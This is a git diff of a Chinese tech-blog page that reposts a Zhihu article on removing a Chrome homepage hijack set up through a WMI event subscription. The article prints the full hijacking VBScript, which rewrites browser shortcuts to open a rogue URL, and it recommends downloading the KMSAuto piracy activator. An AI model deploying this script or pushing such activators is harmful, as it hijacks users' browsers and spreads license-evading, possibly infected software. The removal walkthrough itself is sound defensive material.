@@ -2,14 +2,23 @@
 
 
 
+
+
+
+
+
+
+
+
+
   
 
 
-<html class="theme-next pisces use-motion" lang="zh-Hans">
-<head>
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 
 
@@ -20,15 +29,6 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
 
 
 
@@ -40,7 +40,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
 
 
 
@@ -48,24 +48,16 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png?v=5.1.4">
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
 
 
 
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png?v=7.0.1">
 
 
-
-  <meta name="keywords" content="chrome," />
-
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png?v=7.0.1">
 
 
 
@@ -74,15 +66,44 @@
 
 
 
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: true,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
 
-<meta name="description" content="不少朋友可能都遇到过浏览器的主页被恶意篡改成某些令人作呕的国产网页，具体哪些网站，我想必也不必多说，大家也都心知肚明。">
+
+  
+
+
+
+
+  <meta name="description" content="不少朋友可能都遇到过浏览器的主页被恶意篡改成某些令人作呕的国产网页，具体哪些网站，我想必也不必多说，大家也都心知肚明。">
 <meta name="keywords" content="chrome">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Chrome主页被篡改后如何解决？(部分内容转载)">
 <meta property="og:url" content="http://yoursite.com/2018/01/22/Chrome主页被篡改后如何解决？/index.html">
 <meta property="og:site_name" content="YangGang&#39;Blog">
 <meta property="og:description" content="不少朋友可能都遇到过浏览器的主页被恶意篡改成某些令人作呕的国产网页，具体哪些网站，我想必也不必多说，大家也都心知肚明。">
-<meta property="og:locale" content="zh-Hans">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://pic1.zhimg.com/80/v2-caab8e64d2116cc4a155f646f8093218_hd.jpg">
 <meta property="og:image" content="https://pic1.zhimg.com/50/v2-e22306ce7f2f7559ff99a1a6489a324b_hd.jpg">
 <meta property="og:image" content="https://pic2.zhimg.com/50/v2-3246c0019fcd49aa591733efb67a0e10_hd.jpg">
@@ -97,37 +118,19 @@
 
 
 
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: '博主'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2018/01/22/Chrome主页被篡改后如何解决？/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
   };
 </script>
-
-
-
-  <link rel="canonical" href="http://yoursite.com/2018/01/22/Chrome主页被篡改后如何解决？/"/>
-
-
-
-
 
   <title>Chrome主页被篡改后如何解决？(部分内容转载) | YangGang'Blog</title>
   
@@ -135,22 +138,53 @@
 
 
 
-<script>
-  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-  ga('create', 'UA-98889996-1', 'auto');
-  ga('send', 'pageview');
-</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <script async src="//www.googletagmanager.com/gtag/js?id=UA-98889996-1"></script>
+  <script>
+    var host = window.location.hostname;
+    if (host !== "localhost" || !true) {
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-98889996-1');
+    }
+  </script>
 
 
 
 
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
 
   
   
@@ -162,23 +196,22 @@
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
+  <div class="site-meta">
     
 
     <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">YangGang'Blog</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
-      
-        <p class="site-subtitle"></p>
-      
+    
+    
   </div>
 
   <div class="site-nav-toggle">
-    <button>
+    <button aria-label="切换导航栏">
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
@@ -186,76 +219,111 @@
   </div>
 </div>
 
-<nav class="site-nav">
-  
 
+
+<nav class="site-nav">
   
     <ul id="menu" class="menu">
       
         
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
-      
         
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
         
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            关于
-          </a>
-        </li>
-      
+          
+          <li class="menu-item menu-item-home">
 
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+
+      
       
         <li class="menu-item menu-item-search">
           
             <a href="javascript:;" class="popup-trigger">
           
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
-            
-            搜索
-          </a>
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
         </li>
       
     </ul>
+  
+
   
 
   
@@ -270,9 +338,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
     </div>
   </div>
   <div id="local-search-result"></div>
@@ -286,12 +352,23 @@
 
 
 
- </div>
+  
+
+
+
+</div>
     </header>
+
+    
+
 
     <main id="main" class="main">
       <div class="main-inner">
         <div class="content-wrap">
+          
+            
+
+          
           <div id="content" class="content">
             
 
@@ -304,6 +381,8 @@
   
   
 
+  
+
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
@@ -313,7 +392,7 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="YangGang">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content="(ง •_•)ง">
       <meta itemprop="image" content="https://miao.su/images/2017/03/03/dark_deer302fb.png">
     </span>
 
@@ -326,11 +405,20 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Chrome主页被篡改后如何解决？(部分内容转载)</h1>
+          <h1 class="post-title" itemprop="name headline">Chrome主页被篡改后如何解决？(部分内容转载)
+
+              
+            
+          </h1>
         
 
         <div class="post-meta">
           <span class="post-time">
+
+            
+            
+            
+
             
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
@@ -338,18 +426,35 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-22T13:54:19+08:00">
-                2018-01-22
-              </time>
+
+              
+                
+              
+
+              <time title="创建时间：2018-01-22 13:54:19" itemprop="dateCreated datePublished" datetime="2018-01-22T13:54:19+08:00">2018-01-22</time>
             
 
             
+              
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-03-03 16:11:36" itemprop="dateModified" datetime="2019-03-03T16:11:36+08:00">2019-03-03</time>
+              
             
           </span>
 
           
-            <span class="post-category" >
+            <span class="post-category">
             
               <span class="post-meta-divider">|</span>
             
@@ -360,11 +465,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Tips/" itemprop="url" rel="index">
-                    <span itemprop="name">Tips</span>
-                  </a>
-                </span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Tips/" itemprop="url" rel="index"><span itemprop="name">Tips</span></a></span>
 
                 
                 
@@ -374,14 +475,17 @@
 
           
             
+            
+              
               <span class="post-comments-count">
                 <span class="post-meta-divider">|</span>
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
                 <a href="/2018/01/22/Chrome主页被篡改后如何解决？/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/01/22/Chrome主页被篡改后如何解决？/" itemprop="commentCount"></span>
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/01/22/Chrome主页被篡改后如何解决？/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -409,22 +513,22 @@
       
 
       
-        <script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><p>不少朋友可能都遇到过浏览器的主页被恶意篡改成某些令人作呕的国产网页，具体哪些网站，我想必也不必多说，大家也都心知肚明。</p>
+        <script src="\assets\js\APlayer.min.js"> </script><p>不少朋友可能都遇到过浏览器的主页被恶意篡改成某些令人作呕的国产网页，具体哪些网站，我想必也不必多说，大家也都心知肚明。</p>
 <a id="more"></a>
 <p>篡改浏览器的主页有很多种途径，最常见的就是直接去修改应用程序的快捷方式的 Command line ，强制在默认代码后加入将被导向的流氓网址。用这种方法可以说是挺直接的，我们也最容易发现问题所在。下面转载一篇今天发现并用到的一篇文章，希望能够给您带来一些帮助。</p>
 <p>以下为原文：</p>
 <p><hr></p>
 <p></p><p>最近重装了一次电脑。尽管什么百度系的软件我都没有下载，Chrome浏览器的主页还是被硬生生劫持了。每次点开后的主页是<a href="https://link.zhihu.com/?target=http%3A//hao.qquu8.com" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">http://</span><span class="visible">hao.qquu8.com</span><span class="invisible"></span></a>这个链接，紧接着它会跳向hao123。电脑上原装的其他浏览器（IE和Edge）也是这样，弄得每次打开浏览器就被恶心一下，很是恼火。</p><p><br></p><p></p>
-<p><div align="center"><br><img src="https://pic1.zhimg.com/80/v2-caab8e64d2116cc4a155f646f8093218_hd.jpg" alt=""><br></div></p>
+<p><div align="center"><br><img src="https://pic1.zhimg.com/80/v2-caab8e64d2116cc4a155f646f8093218_hd.jpg" alt><br></div></p>
 <p></p><p><br></p><p>我们先来看看问题在哪。右键快捷方式查看属性：</p><p><br></p><p></p>
-<p><div align="center"><br><img src="https://pic1.zhimg.com/50/v2-e22306ce7f2f7559ff99a1a6489a324b_hd.jpg" alt=""><br></div></p>
+<p><div align="center"><br><img src="https://pic1.zhimg.com/50/v2-e22306ce7f2f7559ff99a1a6489a324b_hd.jpg" alt><br></div></p>
 <p></p><p><br></p><p>哦，原来快捷方式被改了，后面加了一段url。把它删了试试？</p><p>还是不行，几分钟后还是被改回来了。</p><p>我在很多平台上找了解决办法。有的试了没有效果，重新开机后还是一样的毛病，有的推荐装“管家”，但这种以毒攻毒的办法无异于饮鸩止渴。最后终于有一种靠谱的方法，经过实验和一点修改，完美解决！</p><p>主页被劫持的原理是一段通过WMI发起的定时自动运行脚本，WMI（Windows Management Instrumentation）可以理解成Windows系统后台运行的一个事件管理器。为查看WMI事件，先去下载WMITools并安装：<a href="https://link.zhihu.com/?target=https%3A//arlenluo.github.io./images/post6/WMITools.exe" class=" wrap external" target="_blank" rel="nofollow noreferrer">WMI工具</a>。</p><p>之后打开WMI Event Viewer：</p><p><br></p> <p></p>
-<p><div align="center"><br><img src="https://pic2.zhimg.com/50/v2-3246c0019fcd49aa591733efb67a0e10_hd.jpg" alt=""><br></div></p>
-<p></p><p><br></p><p>点击左上角的笔的图标（Register For Events），在弹出的Connect to namespace的框直接点OK，Login的页面也直接点OK。点开左侧栏的EventFilter，再点击下级目录的项目：</p><p><br></p><div align="center"><br><img src="https://pic1.zhimg.com/50/v2-4f424c287c30e2a2ef31acc14043c1c9_hd.jpg" alt=""><br></div><p></p>
+<p><div align="center"><br><img src="https://pic2.zhimg.com/50/v2-3246c0019fcd49aa591733efb67a0e10_hd.jpg" alt><br></div></p>
+<p></p><p><br></p><p>点击左上角的笔的图标（Register For Events），在弹出的Connect to namespace的框直接点OK，Login的页面也直接点OK。点开左侧栏的EventFilter，再点击下级目录的项目：</p><p><br></p><div align="center"><br><img src="https://pic1.zhimg.com/50/v2-4f424c287c30e2a2ef31acc14043c1c9_hd.jpg" alt><br></div><p></p>
 <p></p><p><br></p><p>在右侧栏右键点击ActiveScriptEventConsumer，并通过view instant properties查看属性：</p><p><br></p><p></p>
-<p><div align="center"><br><img src="https://pic7.zhimg.com/50/v2-d6376daf291d17833f10b6976246af9b_hd.jpg" alt=""><br></div></p>
+<p><div align="center"><br><img src="https://pic7.zhimg.com/50/v2-d6376daf291d17833f10b6976246af9b_hd.jpg" alt><br></div></p>
 <p></p><p><br></p><p>在Script Text那一栏我们可以看到这段脚本：</p><div class="highlight"><pre><code class="language-text"><span></span>On Error Resume Next<p></p>
-<p>Const link = “<a href="http://hao.qquu8.com/?m=yx&amp;amp;r=j" target="_blank" rel="noopener">http://hao.qquu8.com/?m=yx&amp;amp;r=j</a>“<br>Const link360 = “<a href="http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3" target="_blank" rel="noopener">http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3</a>“<br>browsers = “114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe”<br>lnkpaths = “C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start Menu\Programs,C:\Users\sjtul\Desktop,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar,C:\Users\sjtul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs”<br>browsersArr = split(browsers,”,”)<br>Set oDic = CreateObject(“scripting.dictionary”)<br>For Each browser In browsersArr<br>​    oDic.Add LCase(browser), browser<br>Next<br>lnkpathsArr = split(lnkpaths,”,”)<br>Set oFolders = CreateObject(“scripting.dictionary”)<br>For Each lnkpath In lnkpathsArr<br>​    oFolders.Add lnkpath, lnkpath<br>Next<br>Set fso = CreateObject(“Scripting.Filesystemobject”)<br>Set WshShell = CreateObject(“Wscript.Shell”)<br>For Each oFolder In oFolders<br>​    If fso.FolderExists(oFolder) Then<br>​        For Each file In fso.GetFolder(oFolder).Files<br>​            If LCase(fso.GetExtensionName(file.Path)) = “lnk” Then<br>​                Set oShellLink = WshShell.CreateShortcut(file.Path)<br>​                path = oShellLink.TargetPath<br>​                name = fso.GetBaseName(path) &amp; “.” &amp; fso.GetExtensionName(path)<br>​                If oDic.Exists(LCase(name)) Then<br>​                    If LCase(name) = LCase(“360se.exe”) Then<br>​                        oDicShellLink.Arguments = link360<br>​                    Else<br>​                        oShellLink.Arguments = link<br>​                    End If<br>​                    If file.Attributes And 1 Then<br>​                        fsoile.Attributes = file.Attributes - 1<br>​                    End If<br>​                    oShellLink.Save<br>​                End If<br>​            End If<br>​        Next<br>​    End If<br>Next<br></p></code></pre></div><p>终于抓到了幕后黑手。可以看到这是一段VBScript代码，攻击目标涵盖了包括Chrome、360、Firefox、搜狗等30余种常见的浏览器。脚本以浏览器的安装地址为切入点，创建WshShell对象，进而生成植入了流氓网站的快捷方式。360浏览器有限定主页格式，于是这段脚本还特地修饰了流氓网站的链接。唉，流氓至此，也是服了。</p><p>查到了源头如何清清除这段造孽的脚本呢？直接在WMI Event Viewer中将_EventFilter.Name=”VBScriptKids_filter”右键删掉会被系统拒绝掉，需要去WMI Event Viewer的安装位置，右键以管理员方式运行exe文件才能删掉。之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\ProgramData\Microsoft\Windows\Start Menu\Programs里改掉。唉，一趟下来真是让人心累，好在最终浏览器摆脱了流氓网站的劫持：</p><p><br></p><div align="center"><br><img src="https://pic2.zhimg.com/50/v2-a571e709fb0cb04219e7f25489fd2272_hd.jpg" alt=""><br></div><p></p>
+<p>Const link = “<a href="http://hao.qquu8.com/?m=yx&amp;amp;r=j" target="_blank" rel="noopener">http://hao.qquu8.com/?m=yx&amp;amp;r=j</a>“<br>Const link360 = “<a href="http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3" target="_blank" rel="noopener">http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3</a>“<br>browsers = “114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe”<br>lnkpaths = “C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start Menu\Programs,C:\Users\sjtul\Desktop,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar,C:\Users\sjtul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs”<br>browsersArr = split(browsers,”,”)<br>Set oDic = CreateObject(“scripting.dictionary”)<br>For Each browser In browsersArr<br>​    oDic.Add LCase(browser), browser<br>Next<br>lnkpathsArr = split(lnkpaths,”,”)<br>Set oFolders = CreateObject(“scripting.dictionary”)<br>For Each lnkpath In lnkpathsArr<br>​    oFolders.Add lnkpath, lnkpath<br>Next<br>Set fso = CreateObject(“Scripting.Filesystemobject”)<br>Set WshShell = CreateObject(“Wscript.Shell”)<br>For Each oFolder In oFolders<br>​    If fso.FolderExists(oFolder) Then<br>​        For Each file In fso.GetFolder(oFolder).Files<br>​            If LCase(fso.GetExtensionName(file.Path)) = “lnk” Then<br>​                Set oShellLink = WshShell.CreateShortcut(file.Path)<br>​                path = oShellLink.TargetPath<br>​                name = fso.GetBaseName(path) &amp; “.” &amp; fso.GetExtensionName(path)<br>​                If oDic.Exists(LCase(name)) Then<br>​                    If LCase(name) = LCase(“360se.exe”) Then<br>​                        oDicShellLink.Arguments = link360<br>​                    Else<br>​                        oShellLink.Arguments = link<br>​                    End If<br>​                    If file.Attributes And 1 Then<br>​                        fsoile.Attributes = file.Attributes - 1<br>​                    End If<br>​                    oShellLink.Save<br>​                End If<br>​            End If<br>​        Next<br>​    End If<br>Next<br></p></code></pre></div><p>终于抓到了幕后黑手。可以看到这是一段VBScript代码，攻击目标涵盖了包括Chrome、360、Firefox、搜狗等30余种常见的浏览器。脚本以浏览器的安装地址为切入点，创建WshShell对象，进而生成植入了流氓网站的快捷方式。360浏览器有限定主页格式，于是这段脚本还特地修饰了流氓网站的链接。唉，流氓至此，也是服了。</p><p>查到了源头如何清清除这段造孽的脚本呢？直接在WMI Event Viewer中将_EventFilter.Name=”VBScriptKids_filter”右键删掉会被系统拒绝掉，需要去WMI Event Viewer的安装位置，右键以管理员方式运行exe文件才能删掉。之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\ProgramData\Microsoft\Windows\Start Menu\Programs里改掉。唉，一趟下来真是让人心累，好在最终浏览器摆脱了流氓网站的劫持：</p><p><br></p><div align="center"><br><img src="https://pic2.zhimg.com/50/v2-a571e709fb0cb04219e7f25489fd2272_hd.jpg" alt><br></div><p></p>
 <p></p><p><br></p><p>当然在这时候，你可以点击之前下载的WMI安装包，把WMI系列工具卸载掉。</p><p>最后提一下电脑中毒的原因。我分析是前几天用了小马激活这个工具来激活Windows系统，当时并没有激活成功反而还引来了病毒。推荐一款<a href="https://link.zhihu.com/?target=https%3A//myfreeproject.com/soft/81-kmsauto-net-2016.html" class=" wrap external" target="_blank" rel="nofollow noreferrer">俄罗斯人开发的工具</a>，可以成功激活Windows系统和Office软件，也不会招来一些流氓脚本：<a href="https://link.zhihu.com/?target=https%3A//arlenluo.github.io./images/post6/KMSAuto-Net-1.4.9.zip" class=" wrap external" target="_blank" rel="nofollow noreferrer">KMSAuto</a></p><p>详见<a href="https://link.zhihu.com/?target=https%3A//jing-luo.github.io/2017/03/DefeatYourBrowser/" class=" wrap external" target="_blank" rel="nofollow noreferrer">抢救被流氓网站劫持的浏览器主页</a></p><hr><p></p>
 <p>注：</p>
 <p>转载自知乎</p>
@@ -434,12 +538,18 @@
 <hr>
       
     </div>
+
+    
+
     
     
     
 
     
 
+    
+      
+    
     
 
     
@@ -489,26 +599,16 @@
   </article>
 
 
-
-    <div class="post-spread">
-      
-    </div>
   </div>
 
 
           </div>
           
 
-
-          
-
   
     <div class="comments" id="comments">
       <div id="disqus_thread">
-        <noscript>
-          Please enable JavaScript to view the
-          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
-        </noscript>
+        <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
       </div>
     </div>
 
@@ -529,100 +629,179 @@
   </div>
 
   <aside id="sidebar" class="sidebar">
-    
     <div class="sidebar-inner">
 
       
 
       
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image"
-                src="https://miao.su/images/2017/03/03/dark_deer302fb.png"
-                alt="YangGang" />
+              <img class="site-author-image" itemprop="image" src="https://miao.su/images/2017/03/03/dark_deer302fb.png" alt="YangGang">
             
               <p class="site-author-name" itemprop="name">YangGang</p>
-              <p class="site-description motion-element" itemprop="description">(ง •_•)ง</p>
+              <div class="site-description motion-element" itemprop="description">(ง •_•)ง</div>
           </div>
 
-          <nav class="site-state motion-element">
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
 
-            
-              <div class="site-state-item site-state-posts">
               
-                <a href="/archives/">
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
               
-                  <span class="site-state-item-count">10</span>
-                  <span class="site-state-item-name">日志</span>
-                </a>
-              </div>
-            
 
-            
               
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
               
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">8</span>
-                  <span class="site-state-item-name">分类</span>
-                </a>
-              </div>
-            
+            </nav>
+          
 
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">11</span>
-                  <span class="site-state-item-name">标签</span>
-                </a>
-              </div>
-            
-
-          </nav>
+          
 
           
 
           
             <div class="links-of-author motion-element">
-                
-                  <span class="links-of-author-item">
-                    <a href="https://github.com/SamuelYG" target="_blank" title="GitHub">
-                      
-                        <i class="fa fa-fw fa-github"></i>GitHub</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="https://twitter.com/yangg052" target="_blank" title="Twitter">
-                      
-                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                  </span>
-                
